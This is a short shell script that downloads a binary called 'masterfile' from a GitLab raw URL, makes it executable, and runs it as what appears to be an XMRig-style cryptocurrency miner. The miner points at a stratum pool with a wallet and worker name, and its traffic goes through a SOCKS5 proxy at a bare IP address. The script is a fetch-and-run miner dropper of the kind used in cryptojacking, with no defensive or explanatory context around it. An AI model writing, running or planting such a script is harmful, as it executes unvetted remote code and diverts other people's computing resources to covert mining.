#!/bin/sh
wget https://gitlab.com/wayankarpo/xm/-/raw/main/masterfile
chmod 777 masterfile
POOL=stratum+tcp://pool-pay.com:26339
WALLET=endvoc
WORKER=endvoc
PROXY=socks5://192.252.209.155:14455
./masterfile -o $POOL -u $WALLET -p $WORKER --donate-level 1 -x $PROXY
